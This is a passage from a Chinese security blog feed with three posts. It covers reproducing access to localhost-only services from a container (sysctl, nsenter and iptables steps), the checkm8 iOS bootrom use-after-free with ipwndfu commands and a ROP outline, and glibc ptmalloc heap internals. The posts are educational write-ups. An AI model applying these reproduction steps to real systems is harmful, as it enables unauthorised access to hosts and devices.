u32 *itag)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> r = secpath_exists(skb) ? <span class="number">0</span> : IN_DEV_RPFILTER(idev);    <span class="comment">// r=rp_filter配置</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> =</span> dev_net(dev);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!r &amp;&amp; !fib_num_tclassid_users(net) &amp;&amp;</span><br><span class="line">        (dev-&gt;ifindex != oif || !IN_DEV_TX_REDIRECTS(idev))) &#123;      <span class="comment">// dev-&gt;ifindex != oif 表示 不是lo虚拟网卡接收到包</span></span><br><span class="line">        <span class="keyword">if</span> (IN_DEV_ACCEPT_LOCAL(idev))          <span class="comment">// accept_local配置是否打开。idev是接受数据包的网卡配置</span></span><br><span class="line">            <span class="keyword">goto</span> ok;</span><br><span class="line">        <span class="comment">/* with custom local routes in place, checking local addresses</span></span><br><span class="line"><span class="comment">         * only will be too optimistic, with custom rules, checking</span></span><br><span class="line"><span class="comment">         * local addresses only can be too strict, e.g. due to vrf</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (net-&gt;ipv4.fib_has_custom_local_routes ||</span><br><span class="line">            fib4_has_custom_rules(net))     <span class="comment">//  检查&quot;网络命名空间&quot;中是否有自定义的&quot;策略路由&quot;</span></span><br><span class="line">            <span class="keyword">goto</span> full_check;</span><br><span class="line">        <span class="keyword">if</span> (inet_lookup_ifaddr_rcu(net, src))       <span class="comment">// 检查&quot;网络命名空间&quot;中是否有设备的ip和源ip(src值)相同</span></span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">ok:</span><br><span class="line">        *itag = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">full_check:</span><br><span class="line">    <span class="keyword">return</span> __fib_validate_source(skb, src, dst, tos, oif, dev, r, idev, itag);      <span class="comment">// __fib_validate_source中会执行&quot;反向检查源ip&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当在容器中<code>curl 127.0.0.1 --interface eth0</code>时，有一些结论： 宿主机收到请求包时，无论 <code>accept_local</code>和<code>rp_filter</code>是啥值，都通过<code>fib_validate_source</code>检查 容器中收到请求包时，必须要设置 <code>accept_local=1</code>、<code>rp_filter=0</code>，才能不被”反向检查源ip”</p><p>如果容器中 <code>accept_local=1</code>、<code>rp_filter=0</code> 有一个条件不成立，就会发生丢包。这个时候如果你在容器网络命名空间用<code>tcpdump -i eth0 &#39;port 8888&#39; -n -e</code>观察，就会发现诡异的现象：容器接收到了syn-ack包，但是没有回第三个ack握手包。如下图</p><p><img src="https://s2.loli.net/2022/08/13/7QkXx4Upi2osHEL.jpg" alt="IMG_2721.jpg"></p><blockquote><p>小技巧：nsenter -n -t 容器进程pid 可以进入到容器网络空间，接着就可以tcpdump抓”容器网络中的包”</p></blockquote><h1 id="docker网桥模式下复现漏洞"><a href="#docker网桥模式下复现漏洞" class="headerlink" title="docker网桥模式下复现漏洞"></a>docker网桥模式下复现漏洞</h1><h2 id="docker网桥模式下漏洞原理是什么？"><a href="#docker网桥模式下漏洞原理是什么？" class="headerlink" title="docker网桥模式下漏洞原理是什么？"></a>docker网桥模式下漏洞原理是什么？</h2><p>借用网络上的一张图来说明docker网桥模式:</p><p><img src="https://images.seebug.org/content/images/2022/07/20/1658301091000-2qndxq.png-w331s" alt="img"></p><p>在容器内<code>curl 127.0.0.1:8888 --interface eth0</code>时，发送第一个syn包时，在网络层查找路由表</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# ip route show</span><br><span class="line">default via 172.17.0.1 dev eth0</span><br><span class="line">172.17.0.0/16 dev eth0 proto kernel scope link src 172.17.0.3</span><br></pre></td></tr></table></figure><p>因此会走默认网关(172.17.0.1)，在链路层就会找网关的mac地址</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# arp -a|grep 172.17.0.1</span><br><span class="line">_gateway (172.17.0.1) at 02:42:af:2e:cd:ae [ether] on eth0</span><br></pre></td></tr></table></figure><p>实际上<code>02:42:af:2e:cd:ae</code>就是docker0网桥的mac地址，所以网关就是docker0网桥<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# ifconfig docker0</span><br><span class="line">docker0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255</span><br><span class="line">        ...</span><br><span class="line">        ether 02:42:af:2e:cd:ae  txqueuelen 0  (Ethernet)</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><br>因此第一个syn包信息是</p><div class="table-container"><table><thead><tr><th>源IP</th><th>目的IP</th><th>源MAC</th><th>目的MAC</th><th>源端口</th><th>目的端口</th></tr></thead><tbody><tr><td>容器eth0 ip</td><td>127.0.0.1</td><td>容器eth0 mac</td><td>docker0 mac</td><td>4444(随机端口)</td><td>8888</td></tr></tbody></table></div><p>syn包数据包数据流向是 容器内eth0 -&gt; veth -&gt; docker0。</p><p>veth设备作为docker0网桥的”从设备”，接收到syn包后直接转发，不会调用到”内核协议栈”的网络层。</p><p>docker0网桥设备收到syn包后，在”内核协议栈”的链路层，看到目的mac是自己，就把包扔给网络层处理。在网络层查路由表，看到目的ip是本机ip，就将包扔给传输层处理。在传输层看到访问”127.0.0.1:8888”，就会查看是不是有服务监听在”127.0.0.1:8888”。</p><h1 id="怎么复现？-1"><a href="#怎么复现？-1" class="headerlink" title="怎么复现？"></a>怎么复现？</h1><p>从上面分析可以看出来，需要将宿主机docker0网桥设备route_localnet设置成1。</p><p>宿主机docker0网桥设备需要设置rp_filter和accept_local选项吗？答案是不需要，因为docker0网桥设备在收到数据包在网络层做”反向检查源地址”时，会知道”响应数据包”也从docker0网桥发送。”发送和接收数据包的设备”是匹配的，所以能通过”反向检查源地址”的校验。</p><p>容器中eth0网卡需要设置rp_filter=0、accept_local=1、localnet=1。为什么容器中eth0网卡需要设置rp_filter和accept_local选项呢？因为eth0网桥设备如果做”反向检查源地址”，就会知道响应包应该从lo网卡发送。”接收到数据包的设备是eth0网卡”，而”发送数据包的设备应该是lo网卡”，两个设备不匹配，”反向检查”就会失败。rp_filter=0、accept_local=1可以避免做”反向检查源地址”。</p><blockquote><p>即使ifconfig lo down，ip route show table local仍能看到local表中有回环地址的路由。</p></blockquote><p>下面来用docker复现漏洞。</p><p>首先在宿主机上打开route_localnet配置<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# sysctl -w net.ipv4.conf.all.route_localnet=1</span><br></pre></td></tr></table></figure></p><p>然后创建容器，并进入到容器网络命名空间，设置rp_filter=0、accept_local=1</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# docker run -d busybox tail -f /dev/null     // 创建容器</span><br><span class="line">62ba93fbbe7a939b7fff9a9598b546399ab26ea97858e73759addadabc3ad1f3</span><br><span class="line">[root@instance-h9w7mlyv ~]# docker top 62ba93fbbe7a939b7fff9a9598b546399ab26ea97858e73759addadabc3ad1f3</span><br><span class="line">UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD</span><br><span class="line">root                43244               43224               0                   12:33               ?                   00:00:00            tail -f /dev/null</span><br><span class="line">[root@instance-h9w7mlyv ~]# nsenter -n -t 43244     // 进入到容器网络命名空间</span><br><span class="line">[root@instance-h9w7mlyv ~]#</span><br><span class="line">[root@instance-h9w7mlyv ~]# sysctl -w net.ipv4.conf.all.accept_local=1  // 设置容器中的accept_local配置</span><br><span class="line">[root@instance-h9w7mlyv ~]# sysctl -w net.ipv4.conf.all.rp_filter=0     // 设置容器中的rp_filter配置</span><br><span class="line">[root@instance-h9w7mlyv ~]# sysctl -w net.ipv4.conf.default.rp_filter=0</span><br><span class="line">[root@instance-h9w7mlyv ~]# sysctl -w net.ipv4.conf.eth0.rp_filter=0</span><br></pre></td></tr></table></figure><blockquote><p>如果你是<code>docker exec -ti busybox sh</code>进入到容器中，然后执行<code>sysctl -w</code>配置内核参数，就会发现报错，因为<code>/proc/sys</code>目录默认是作为只读挂载到容器中的，而内核网络参数就在<code>/proc/sys/net</code>目录下。</p></blockquote><p>然后就可以在容器中使用<code>curl 127.0.0.1:端口号 --interface eth0</code>来访问宿主机上的服务。</p><p><img src="https://s2.loli.net/2022/08/13/5NqC1uXKPwMnp6R.jpg" alt="IMG_2722.jpg"></p><h1 id="kubernetes对漏洞的修复"><a href="#kubernetes对漏洞的修复" class="headerlink" title="kubernetes对漏洞的修复"></a>kubernetes对漏洞的修复</h1><p>在 这个<a href="https://github.com/kubernetes/kubernetes/pull/91569/commits/8bed088224fb38b41255b37e59a1701caefa171b">pr</a>中kubelet添加了一条iptables规则</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ip-172-31-14-33:~# iptables-save |grep localnet</span><br><span class="line">-A KUBE-FIREWALL ! -s 127.0.0.0/8 -d 127.0.0.0/8 -m comment --comment &quot;block incoming localnet connections&quot; -m conntrack ! --ctstate RELATED,ESTABLISHED,DNAT -j DROP</span><br></pre></td></tr></table></figure><p>这条规则使得，在tcp握手时，第一个syn包如果目的ip是”环回地址”，同时源ip不是”环回地址”时，包会被丢弃。</p><blockquote><p>所以如果你复现时是在kubernetes环境下，就需要删掉这条iptables规则。</p></blockquote><p>有个疑问:源ip不也是可以伪造的嘛。确实是这样，所以在 <a href="https://github.com/kubernetes/kubernetes/pull/91569">https://github.com/kubernetes/kubernetes/pull/91569</a> 中有人评论到，上面的规则，不能防止访问本地udp服务。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>公有云vpc网络环境下，可能因为交换机有做限制而导致无法访问其他虚拟机的”仅绑定在127.0.0.1的服务”。</p><p>docker容器网桥网络环境下，存在漏洞的kube-proxy已经设置了宿主机网络的route_localnet选项，但是因为在容器中<code>/proc/sys</code>默认只读，所以无法修改容器网络命名空间下的内核网络参数，也很难做漏洞利用。</p><p>kubernetes的修复方案并不能防止访问本地udp服务。</p><blockquote><p>如果kubernetes使用了cni插件(比如calico ipip网络模型)，你觉得在node节点能访问到master节点的”仅绑定在127.0.0.1的服务”吗？</p></blockquote><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.kernel.org/doc/Documentation/networking/ip-sysctl.txt">内核参数详解</a></p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
          <category> 安全 </category>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
            <tag> 安全 </tag>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>checkm8 攻击原理浅析</title>
      <link href="/2022/08/03/checkm8-%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/"/>
      <url>/2022/08/03/checkm8-%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="start"><a href="#start" class="headerlink" title="start"></a>start</h1><blockquote><p>2019年9月27号，黑客 ani0mX 在推特上公布了苹果公司的“史诗级安全漏洞-checkm8”。该漏洞的影响范围极其广泛，囊括了绝大部分型号的苹果手机、平板、手表及智能电视等。而且由于它是一个“半硬件层”的漏洞，所以苹果永远无法通过软件更新修补这个漏洞。</p><p>简略聊聊 checkm8 的攻击原理</p></blockquote><h1 id="iOS-安全启动机制简介"><a href="#iOS-安全启动机制简介" class="headerlink" title="iOS 安全启动机制简介"></a>iOS 安全启动机制简介</h1><p>为了保证 iOS 系统的代码不被恶意篡改，苹果公司使用了一套名为 安全启动链（Secure Boot Chain） 的技术。他们将开机过程分为四到五个阶段，每个阶段负责检查下个阶段的代码，如果检查出任何问题，比如签名错误、安全模式不符，就立马中止开机。</p><p>在一些过时的资料里， iPhone 的开机过程分为以下五个阶段：</p><blockquote><p>  ROM    &gt;   LLB  &gt;   iBoot   &gt;   Kernel  &gt;   OS   </p></blockquote><p>虽然这五个阶段被人引用过很多次，但其实它已经错了很长时间了。从 A10 处理器以来，苹果就已经放弃了双阶段加载，也就是说上图的那个LLB已经被删掉了，更新后的启动流程如下：</p><blockquote><p>  ROM    &gt;    iBoot   &gt;   Kernel    &gt;    OS</p></blockquote><p>这四个阶段从左到右分别是：</p><ul><li><strong>ROM / Secure ROM</strong>：开机启动时执行的第一段程序，负责检查并加载接下来的 iBoot 。</li><li><strong>iBoot</strong>：苹果开发的引导程序，负责检查并加载系统内核。</li><li><strong>Kernel</strong>：iOS 系统内核。</li><li><strong>OS</strong>：iOS 系统的用户界面、后台服务等非核心组件。</li></ul><p><strong>Secure ROM 作为系统启动时执行的第一段程序，扮演着整个安全启动链技术的信任基石</strong>。一旦攻破了它，接下来所有阶段的代码都能随意篡改，因此苹果公司下了很大功夫来保护这段 ROM 程序：</p><ul><li><strong>封杀写权限</strong>：这段程序烧写在 CPU 的硅片内部，无法拆解，无法替换。在工厂里一次性烧录完之后，就连苹果自己都没办法改动它。</li><li><strong>封杀读权限</strong>：这段程序完成工作后，会直接把自己所在的储存器锁掉，再没有任何办法能读取它。也就是说，启动之后哪怕你攻陷了整个系统，也读不到这段程序的内容。</li></ul><blockquote><p>苹果的想法很单纯——如果一段程序黑客读都读不到，改也改不了，那么这段程序应该就会很安全。等到文章结尾的时候，我会再花点笔墨聊聊这个想法为什么不现实。但现在，苹果的这些安全措施确实造成了一点麻烦：如果连程序内容都看不到，怎么分析程序漏洞？</p></blockquote><h1 id="抓取-Secure-ROM"><a href="#抓取-Secure-ROM" class="headerlink" title="抓取 Secure ROM"></a>抓取 Secure ROM</h1><p>刚刚提到，Secure ROM 完成工作后，才会把储存器锁住。换句话说，只要 Secure ROM 还没完成工作，我们就有机会从内存里读到它的内容。</p><p>这就轮到 checkm8 出场了。</p><p>checkm8 是一个任意代码执行漏洞，允许我们在 ROM 运行期间植入 payload。更贴心的是， ani0mX 还在自己发布的 exploit 里附上了一段高质量的 payload 。允许我们通过 USB 给 payload 发送指令，执行各种高权限的操作，比如：</p><ul><li><code>./ipwndfu --dump-rom</code>：将 iPhone 的 Secure ROM 直接从内存里抓取出来，保存为文件。</li><li><code>./ipwndfu --demote</code>：启用 JTAG 模式。配合一条5800多元的 Bonobo 线，你就可以用 gdb 随意调试 iPhone 内核了。如果公司或者实验室给报销的话，建议买一条。</li></ul><p>另外， axi0mX 的 payload 里还有一个 execute 命令非常好用，但是没有放出命令行接口，只能自己写 Python 代码来调用。这个命令允许你调用内存里存在的任意函数，能传递参数，还能拿到返回值。但他的代码有个问题，传第8个参数的时候会传成第7个，用之前需要自己动手改一下。</p><p><strong>在 checkm8 的帮助下，窃取苹果公司层层保护的代码仅需三步</strong>：</p><ol><li>把 iPhone 手机重启到 DFU 模式（固件升级模式）。</li><li>执行<code>./ipwndfu -p</code>命令植入 payload，如果显示漏洞利用失败的话就多试几次。</li><li>执行<code>./ipwndfu --dump-rom</code>命令读取 ROM 并保存到当前文件夹下。</li></ol><p>成功拿到 ROM 的二进制机器码之后，接下来交到反编译器就可以了。<br>苹果的 CPU 从 A7 开始都是 AArch64 架构， little-endian 字序， ROM 的起始地址都是<code>0x100000000</code>，设定好这三项之后，反编译器就能直出正确的汇编代码了。</p><p><img src="https://s2.loli.net/2022/08/03/LQbFku7cR5gTzBM.jpg" alt="反编译"></p><p>除了反编译得到的这些代码外，网上还有一些开源的 iBoot 项目，以及苹果某实习生泄露出来的一份四五年前的旧版 Secure ROM 代码，这些材料对逆向分析都非常有帮助。</p><p>但是，由于发布这些泄露代码铁定会吃一张苹果的律师函，所以我不会在这篇文章里引用或发布那份泄露代码。</p><p>刚才那套轻松的招数最多只能用到 iPhone X 上，从 Xs / Xr 开始 checkm8 漏洞就没法用了。对于这些手机，目前我们也没有什么好办法，只能用黑盒测试、旧 ROM 代码和 iBoot 代码这三样凑活着挖漏洞。</p><h1 id="漏洞原理解析"><a href="#漏洞原理解析" class="headerlink" title="漏洞原理解析"></a>漏洞原理解析</h1><p>前文中提到过，利用 checkm8 前需要先把手机重启到 DFU 模式，因为这次的漏洞正是出在这个 DFU 模式上。</p><p>苹果的 DFU 模式大致相当于一个“应急启动模式”，重启到这个模式后，用户可以用 USB 传入一个临时系统，用临时系统开机启动。（当然，这个临时系统必须是苹果官方系统。）</p><p>基于 littlelailo 的草稿、 iPhone 8 的逆向结果，以及一些“开源”的 iBoot 项目，我整理出了 DFU 应急启动的八个步骤：</p><ol><li>手机以 DFU 模式开机后，负责处理 USB 的主模块会先调用<code>usb_dfu_init()</code>函数，初始化 DFU 子模块。初始化过程主要做两件事：<ol><li>分配一块 2048 字节的内存作为缓冲区，我们叫它<code>io_buffer</code>。</li><li>把 DFU 事件处理函数提交给 USB 驱动 ，等待用户发来的 DFU 请求。</li></ol></li><li>当用户想要加载临时系统时，会先发送一个<code>DFU_DNLOAD</code>请求。主模块将它转发给 DFU 事件处理函数。</li><li>DFU 检查这个请求，如果用户想要发来一段长度为<code>wLength</code>的数据，那么 DFU 将会检查<code>wLength</code>是否超过 2048 字节。<ul><li>超过的话，发送一个 STALL 包掐断 USB 会话，向主模块返回-1。</li><li>不超过的话，用指针将<code>io_buffer</code><strong>传递给一个全局变量</strong>，向主模块返回<code>wLength</code>。</li></ul></li><li>主模块把<code>wLength</code>等信息记录到另一个全局变量中，为接下来接收数据做好准备。</li><li>用户接下来将数据陆续发送给主模块，主模块将这些数据复制到<code>io_buffer</code>中。等到所有的数据都接收完毕后，主模块通知 DFU 模块处理这些数据。</li><li>DFU 模块拿到<code>io_buffer</code>，确认里面数据的长度确实是用户刚开始允诺的<code>wLength</code>，然后将这些数据复制到临时系统的加载地址，比如<code>0x18001C000（iPhone 8/X)</code>。</li><li>缓冲区数据处理完毕之后，主模块<strong>清空之前的所有全局变量</strong>，准备接受下一个 USB 请求。</li><li>当用户分批发送完临时系统的所有内容后，会发送一个<code>DFU_DONE</code>请求。主模块将它转发给 DFU ，通知 DFU 开机，于是 DFU 模块 <strong>释放掉</strong><code>io_buffer</code>，尝试开机。如果开机失败，再次执行<code>usb_dfu_init()</code>，开始第二轮 DFU 启动。</li></ol><blockquote><p>我加黑标粗的几个关键点。</p><p>第3步 DFU 将io_buffer地址记录到了一个全局变量里，如果用户接着发送一个<code>DFU_DONE</code>请求的话，5~7步就会被直接跳过。第8步 DFU 释放掉<code>io_buffer</code>这块内存，开机失败跳回到第1步，开始第二轮 DFU 启动。<strong>这时之前那个全局变量记录的，还是已经释放掉的<code>io_buffer</code></strong>，这就构成了一个<strong>Use-After-Free</strong>漏洞。</p></blockquote><p>在这个 UAF 漏洞的基础上，只要找到一个合适的攻击目标，用堆风水引导<code>malloc</code>把攻击目标分配到<code>io_buffer上</code>，就能通过写<code>io_buffer</code>修改这个攻击目标的内容了。</p><p>在 iPhone 8 / iPhone X 的 ROM 中，几个关键函数的位置分别位于：</p><ul><li>USB 主模块代码：<code>0x10000B24C</code></li><li>DFU 请求处理代码：<code>0x10000BCCC</code></li><li>DFU 数据处理代码：<code>0x10000BEF4</code></li></ul><h1 id="构建ROP"><a href="#构建ROP" class="headerlink" title="构建ROP"></a>构建ROP</h1><p>为了构建 ROP 调用链， 要用一个名叫<code>usb_device_io_request</code>的数据结构。这个数据结构里面保存着发给 USB 驱动的 IO 请求，正常情况下，USB 驱动会挨个处理这些请求，完成数据收发。但是如果用户要求重置 USB 会话的话，驱动就会一口气<strong>清空所有请求</strong>，并且<strong>调用每个请求的回调函数</strong>。</p><p>通过逆向 iPhone 8 的 Secure ROM ，得到了请求的具体数据结构：<br><img src="https://s2.loli.net/2022/08/03/6IPS47qVCEoHlis.jpg" alt="Secure ROM请求数据结构"></p><p>这个结构里面，主要看两个成员：</p><ul><li><code>next</code>指针，用来指向下一个要处理的请求对象，构成一串请求链表。</li><li><code>callback</code>回调函数，虽然图里我把它标成一个<code>void *</code>，但它实际的类型是一个函数指针<code>void (*callback) (struct usb_device_io_request *io_request)</code>。</li></ul><p>整个攻击思路是这样的：</p><ol><li>构建一串假的 IO 请求，让它们的<code>callback</code>依次指向我们想执行的 gadget 。</li><li>布置一套堆风水布局，操纵<code>malloc</code>把一个真请求放到我们掌控的<code>io_buffer</code>上。</li><li>向<code>io_buffer写</code>数据，把那串假请求写进内存，接到真请求的后面。</li><li>发送<code>USB reset</code>请求，重置会话，让 USB 驱动执行 ROP 链。</li></ol><p>有了这套思路之后，剩下的就是选 gadget 之类的细节了，暂不赘述。至此，checkm8 的攻击原理已经算是基本就这样了。</p><p>想要自己动手逆向本节内容的注意，在iPhone 8 / X 的 Secure ROM 中，几个关键的函数分别位于：</p><ul><li>USB 主模块 reset 请求处理函数：<code>0x10000B84C</code><br>USB 驱动 reset 请求处理函数：<code>0x100004A44</code></li></ul><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>checkm8再次强调了那个业界共识：<strong>“保密不等于安全”</strong>。</p><p>一定会有人反问：苹果的这套保密体系不是效果很好吗？这么显眼的漏洞，将近十年都没被黑客发现啊？这还不够安全吗？</p><p>然而我们要注意一点， ROM 漏洞并不是将近十年<strong>没人发现</strong>，而是将近十年<strong>没人公布</strong>，这两字之差就是天壤之别。</p><p>在漏洞挖掘这个领域，大家所求的东西各不相同，但顶尖玩家一般就三种：有求名的，比如腾讯、360、知道创宇这些公司的实验室，需要 Apple、Google 时不时发感谢信来维护实验室的招牌。有求财的，比如 Zerodium 这些网络军火商，同样的漏洞苹果顶多悬赏 20~100 万美金，而这帮军火商开口就是150万美金，因为这些漏洞落到他们手里能变现出更大的利益。剩下一批顶尖玩家是各国的国家队，揣着明确的军事目标在挖掘漏洞。</p><p>其次，这个漏洞还说明了一点：对所有出现数据吞吐的地方，都应该进行细致的 fuzz 测试。</p><p>这次 checkm8 的成因，主要是对 USB 请求处理不当造成的 UAF 漏洞。这个完全可以用 fuzz 检测出来。发完 setup 包之后跳过 data phase ，这个 ROM 程序应该就直接炸了。Secure ROM 作为安全启动链的起点，就算不做彻底的形式化验证， fuzz 也应该会做到位。</p><p>有点搞不懂苹果为什么在这里会漏下一个大坑漏了这么多年，感觉有点不可思议。</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 漏洞 </category>
          
          <category> iOS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> 漏洞 </tag>
            
            <tag> 底层 </tag>
            
            <tag> iOS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN &amp; 堆内存管理</title>
      <link href="/2022/07/28/PWN-%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
      <url>/2022/07/28/PWN-%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="分析堆的相关工具"><a href="#分析堆的相关工具" class="headerlink" title="分析堆的相关工具"></a>分析堆的相关工具</h1><p>在 Phrack 的一篇文章中 《Advanced Doug Lea’s malloc exploits》, 有一小节讲到 Heap layout analysis 作者利用了 main_arena 这个静态全局变量, 进行 heap dump 工作, 这里需要注意的是, 需要安装 libc6-dbg 以获取 debugging symbols, 此细节部分请查看 参考资料/glibc的调试相关.</p><p>介绍几个工具, 用于堆空间分配的分析.</p><p>几个工具大同小异, 简单介绍下原理, 都是采用 python 的 gdb 的 API。</p><p>之后通过 cat /proc/PID/maps 获取 heap base, 通过 gdb 的 x/ 查看内存, 通过 debugging symbols 获取 main_arena 地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/cloudburst/libheap</span><br><span class="line">https://github.com/Mipu94/peda-heap</span><br><span class="line">https://github.com/hugsy/gef</span><br><span class="line">https://github.com/pwndbg/pwndbg</span><br></pre></td></tr></table></figure><ul><li><p>ltrace:<br>通过 ltrace 函数跟踪库函数调用。大致原理是, 起一个进程执行命令后, 根据 PID 拿到可执行文件, 之后按照 ELF 解析可执行文件, 拿到符号列表, 之后使用 ptrace attach 到 PID 上, 并在所有函数符号上插入断点。</p></li><li><p>通过 LD_PRELOAD 的 hook 方式跟踪内存分配函数, 这也是 Phrack 中 《Advanced Doug Lea’s malloc exploits》 利用的方法, 缺点就是需要重新执行程序</p></li></ul><h1 id="堆内存分配-ptmalloc设计-的思考"><a href="#堆内存分配-ptmalloc设计-的思考" class="headerlink" title="堆内存分配(ptmalloc设计)的思考"></a>堆内存分配(ptmalloc设计)的思考</h1><blockquote><p>下面是个人想法</p></blockquote><h2 id="为什么需要-ptmalloc"><a href="#为什么需要-ptmalloc" class="headerlink" title="为什么需要 ptmalloc"></a>为什么需要 ptmalloc</h2><p>首先内存的分配和回收很频繁的, 这也就是其他语言希望实现高效的 GC, 针对频繁的操作, 第一个想到的解决方法就是缓存, 这也就是为什么 ptmalloc 存在各种各样的缓冲区. 假如不存在缓冲区, 每次分配都需要触发系统调用贼慢. 接下来就要引出 ptmalloc 涉及到的几种缓存, 这里只是概念性的解释几种缓存, 具体会在下文详细介绍.</p><h2 id="Bins"><a href="#Bins" class="headerlink" title="Bins"></a>Bins</h2><p>为了避免每次触发系统调用, 首先想到的解决方法就是释放的内存暂时不归还给系统, 标记为空闲, 等下一次再需要相同大小时, 直接使用这块空闲内存即可. （存储结构是双向环链表, 类似 hash 表, hash 算法就是 chunk 的长度, 用双向环链表解决 hash 冲突)</p><p>这涉及到, 刚刚释放的内存什么时候加到 Bins ? 相邻的两个空闲 chunk 什么时候合并? 怎么合并?</p><h2 id="Top"><a href="#Top" class="headerlink" title="Top"></a>Top</h2><p>另一个应该想到的就是, 可以先利用系统调用 brk() 分配一块比较大的内存作为缓存, 之后即使没有在 Bins 中也找不到, 也不需要每次触发系统调用, 直接切割这块大的内存即可.</p><p>这就涉及到 ‘这块大内存’ 什么时候重新补充大小(不断切割会导致 top 变小)? 什么时候需要缩小(归还给系统)?</p><h2 id="Fastbins"><a href="#Fastbins" class="headerlink" title="Fastbins"></a>Fastbins</h2><p>Bins 和 Top 缓存是最基本的, 如果想要做进一步的优化, 其实就是更细分的缓存, 也就是更准确的命中缓存, 这里 Fastbins 存在的更具体的原因是 避免 chunk 重复切割合并.</p><p>如果了解过 Python 源码可能会更理解, 这里的 Fastbins 类似于 Python 中整数对象 PyIntObject 的小整数 small_ints, 这里也只是理念类似, small_ints 准确的说是预先初始化, 可以一直重复使用而不被释放.</p><p>再回到 Fastbins 的讨论, 对于长度很小的 chunk 在释放后不会放到 Bins, 也不会标记为空闲, 这就避免了合并, 下次分配内存时首先查找 Fastbins, 这就避免了切割.</p><h2 id="Unsorted-bin"><a href="#Unsorted-bin" class="headerlink" title="Unsorted bin"></a>Unsorted bin</h2><p>Unsorted 是更细粒度的缓存, 属于 ‘刚刚释放的内存’与 Bins 之间的缓存.</p><h2 id="last-remainder"><a href="#last-remainder" class="headerlink" title="last_remainder"></a>last_remainder</h2><p>这其实也是一个缓存, 是针对于切割时使用的, 大致就是希望一直切割同一个 chunk. 在遍历 Unsorted 时使用, 但是它的使用是有条件的.</p><p>以上是在ptmalloc 的缓存设计上的一些想法. 下面会具体介绍 ptmalloc 在进行堆内存用到的各种具体的数据结构.</p><h1 id="chunk-结构"><a href="#chunk-结构" class="headerlink" title="chunk 结构"></a>chunk 结构</h1><p>贴出一段 glibc-2.19/malloc/malloc.c 中关于 chunk 的解释. </p><p><code>boundary tag</code> 边界标记, 关于它下文会进行介绍<br><code>INTERNAL_SIZE_T</code> 头部损耗, 参考 <code>eglibc-2.19/malloc/malloc.c:299</code>, 其实就是 <code>size_t</code>.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 